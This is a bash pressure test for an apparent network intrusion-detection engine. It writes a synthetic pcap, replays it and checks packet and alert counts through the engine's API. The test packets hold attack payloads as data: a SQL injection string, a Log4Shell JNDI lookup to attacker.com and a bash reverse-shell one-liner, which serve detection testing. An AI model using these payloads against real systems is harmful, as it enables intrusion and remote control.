#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TMP_DIR="$(mktemp -d)"
ENGINE_PID=""

REPEATS="${PRESSURE_REPEATS:-1000}"
WAIT_ATTEMPTS="${PRESSURE_WAIT_ATTEMPTS:-1200}"
EXPECTED_PACKETS=$((REPEATS * 6))
EXPECTED_ALERTS=$((REPEATS * 5))

cleanup() {
    if [[ -n "${ENGINE_PID}" ]] && kill -0 "${ENGINE_PID}" 2>/dev/null; then
        kill "${ENGINE_PID}" 2>/dev/null || true
        wait "${ENGINE_PID}" 2>/dev/null || true
    fi
    rm -rf "${TMP_DIR}"
}
trap cleanup EXIT

PORT="$(python3 - <<'PY'
import socket

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind(("127.0.0.1", 0))
    print(s.getsockname()[1])
PY
)"

UDS_PATH="${TMP_DIR}/netsentry.sock"
DB_PATH="${TMP_DIR}/netsentry.db"
CONFIG_PATH="${TMP_DIR}/config.yaml"
PCAP_PATH="${TMP_DIR}/pressure.pcap"

cat >"${CONFIG_PATH}" <<EOF_CFG
capture:
  mode: "offline"
  offline_file: "${PCAP_PATH}"
  payload_preview_len: 4096
  uds_socket_path: "${UDS_PATH}"
  uds_socket_mode: "0600"
  heartbeat_interval: 5

engine:
  uds_socket_path: "${UDS_PATH}"
  channel_buffer_size: 20000
  worker_count: 1
  db_dir: "${TMP_DIR}"
  db_path: "${DB_PATH}"
  db_shard_daily: false
  db_journal_mode: "WAL"
  db_busy_timeout: 5000
  rules_seed_file: "${ROOT_DIR}/configs/rules.json"
  api_port: ${PORT}
  cors_allowed_origins: ["http://localhost:3000"]
  alert_aggregation_window: 60
  alert_aggregation_max_count: 100
  alert_retention_days: 7
  api_auth_enabled: false
  api_auth_token: ""
  redact_sensitive_fields: true
  health_freshness_limit_seconds: 30
  pprof_enabled: false
  pprof_addr: "127.0.0.1:6060"

logging:
  level: "warn"
  format: "json"
  engine_log: "${TMP_DIR}/engine.log"
EOF_CFG

python3 - "${PCAP_PATH}" "${REPEATS}" <<'PY'
import socket
import struct
import sys
import time

dest = sys.argv[1]
repeats = int(sys.argv[2])

packets = [
    ("tcp", "10.0.0.1", "10.0.0.2", 54321, 80,
     b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n"),
    ("tcp", "10.0.0.3", "10.0.0.2", 54322, 80,
     b"GET /search?q=1'+union+select+1,2,3-- HTTP/1.1\r\n\r\n"),
    ("tcp", "10.0.0.4", "10.0.0.2", 54323, 80,
     b"GET / HTTP/1.1\r\nX-Api-Version: ${jndi:ldap://attacker.com/a}\r\n\r\n"),
    ("tcp", "10.0.0.5", "10.0.0.2", 54324, 4444,
     b"bash -i >& /dev/tcp/192.168.1.1/4444 0>&1"),
    ("tcp", "10.0.0.6", "10.0.0.2", 54325, 80,
     b"GET / HTTP/1.1\r\nUser-Agent: sqlmap/1.7\r\n\r\n"),
    ("udp", "10.0.0.1", "8.8.8.8", 12345, 53, b"\x00\x01\x00\x00"),
]

def ipv4_header(src, dst, proto, payload_len):
    return struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, 20 + payload_len, 0, 0, 64, proto, 0,
        socket.inet_aton(src), socket.inet_aton(dst),
    )

def tcp_packet(src, dst, sport, dport, payload):
    eth = b"\x02\x00\x00\x00\x00\x02" + b"\x02\x00\x00\x00\x00\x01" + struct.pack("!H", 0x0800)
    tcp = struct.pack("!HHIIBBHHH", sport, dport, 1, 1, 0x50, 0x18, 8192, 0, 0)
    return eth + ipv4_header(src, dst, 6, len(tcp) + len(payload)) + tcp + payload

def udp_packet(src, dst, sport, dport, payload):
    eth = b"\x02\x00\x00\x00\x00\x02" + b"\x02\x00\x00\x00\x00\x01" + struct.pack("!H", 0x0800)
    udp = struct.pack("!HHHH", sport, dport, 8 + len(payload), 0)
    return eth + ipv4_header(src, dst, 17, len(udp) + len(payload)) + udp + payload

frames = []
for proto, src, dst, sport, dport, payload in packets:
    if proto == "tcp":
        frames.append(tcp_packet(src, dst, sport, dport, payload))
    else:
        frames.append(udp_packet(src, dst, sport, dport, payload))

with open(dest, "wb") as f:
    f.write(struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
    base = int(time.time())
    idx = 0
    for _ in range(repeats):
        for frame in frames:
            f.write(struct.pack("<IIII", base, idx % 1000000, len(frame), len(frame)))
            f.write(frame)
            idx += 1

print(f"[pressure] wrote {idx} packets to {dest}")
PY

cd "${ROOT_DIR}"

bin/netsentry-engine -config "${CONFIG_PATH}" >"${TMP_DIR}/engine.stdout" 2>"${TMP_DIR}/engine.stderr" &
ENGINE_PID="$!"

for _ in $(seq 1 50); do
    if curl -fsS "http://127.0.0.1:${PORT}/api/health" >/dev/null 2>&1; then
        break
    fi
    if ! kill -0 "${ENGINE_PID}" 2>/dev/null; then
        echo "[pressure] engine exited before health check passed" >&2
        cat "${TMP_DIR}/engine.stderr" >&2 || true
        exit 1
    fi
    sleep 0.1
done

curl -fsS "http://127.0.0.1:${PORT}/api/health" >/dev/null

START_NS="$(python3 - <<'PY'
import time
print(time.monotonic_ns())
PY
)"
bin/netsentry-capture -r "${PCAP_PATH}" -s "${UDS_PATH}" -c 5 >"${TMP_DIR}/capture.stdout" 2>"${TMP_DIR}/capture.stderr"

HEALTH_JSON="${TMP_DIR}/health.json"
ALERTS_JSON="${TMP_DIR}/alerts.json"

for _ in $(seq 1 "${WAIT_ATTEMPTS}"); do
    curl -fsS "http://127.0.0.1:${PORT}/api/health?verbose=true" >"${HEALTH_JSON}"
    if python3 - "${HEALTH_JSON}" "${EXPECTED_PACKETS}" "${EXPECTED_ALERTS}" <<'PY'
import json
import sys

with open(sys.argv[1], "r", encoding="utf-8") as f:
    health = json.load(f)
throughput = health.get("throughput", {})
expected_packets = int(sys.argv[2])
expected_alerts = int(sys.argv[3])
ok = (
    throughput.get("packets_received") == expected_packets and
    throughput.get("packets_processed") == expected_packets and
    throughput.get("alerts_generated") == expected_alerts
)
sys.exit(0 if ok else 1)
PY
    then
        break
    fi
    sleep 0.05
done

END_NS="$(python3 - <<'PY'
import time
print(time.monotonic_ns())
PY
)"

curl -fsS "http://127.0.0.1:${PORT}/api/health?verbose=true" >"${HEALTH_JSON}"
curl -fsS "http://127.0.0.1:${PORT}/api/alerts?per_page=100" >"${ALERTS_JSON}"

python3 - "${HEALTH_JSON}" "${ALERTS_JSON}" "${EXPECTED_PACKETS}" "${EXPECTED_ALERTS}" "${START_NS}" "${END_NS}" <<'PY'
import json
import sys

health_path, alerts_path = sys.argv[1], sys.argv[2]
expected_packets = int(sys.argv[3])
expected_alerts = int(sys.argv[4])
start_ns = int(sys.argv[5])
end_ns = int(sys.argv[6])

with open(health_path, "r", encoding="utf-8") as f:
    health = json.load(f)
with open(alerts_path, "r", encoding="utf-8") as f:
    alerts = json.load(f)

throughput = health.get("throughput", {})
capture = health.get("capture", {})
data = alerts.get("data", [])
pagination = alerts.get("pagination", {})
aggregated_total = sum(int(alert.get("aggregated_count", 0)) for alert in data)

errors = []
if throughput.get("packets_received") != expected_packets:
    errors.append(f"expected packets_received={expected_packets}, got {throughput.get('packets_received')!r}")
if throughput.get("packets_processed") != expected_packets:
    errors.append(f"expected packets_processed={expected_packets}, got {throughput.get('packets_processed')!r}")
if throughput.get("alerts_generated") != expected_alerts:
    errors.append(f"expected alerts_generated={expected_alerts}, got {throughput.get('alerts_generated')!r}")
if throughput.get("decode_errors") != 0:
    errors.append(f"expected decode_errors=0, got {throughput.get('decode_errors')!r}")
if throughput.get("alert_write_errors") != 0:
    errors.append(f"expected alert_write_errors=0, got {throughput.get('alert_write_errors')!r}")
if capture.get("heartbeat", {}).get("sent") != expected_packets:
    errors.append(f"expected final heartbeat sent={expected_packets}, got {capture.get('heartbeat', {}).get('sent')!r}")
if pagination.get("total") != 5:
    errors.append(f"expected 5 aggregated alert rows, got {pagination.get('total')!r}")
if aggregated_total != expected_alerts:
    errors.append(f"expected aggregated_count total={expected_alerts}, got {aggregated_total}")

if errors:
    for err in errors:
        print(f"[pressure] {err}", file=sys.stderr)
    sys.exit(1)

elapsed = max((end_ns - start_ns) / 1_000_000_000, 0.000001)
pps = expected_packets / elapsed
alerts_per_sec = expected_alerts / elapsed
print(
    "[pressure] ok: "
    f"packets={expected_packets} alerts={expected_alerts} "
    f"aggregated_rows=5 elapsed_sec={elapsed:.3f} "
    f"pps={pps:.0f} alerts_per_sec={alerts_per_sec:.0f}"
)
PY
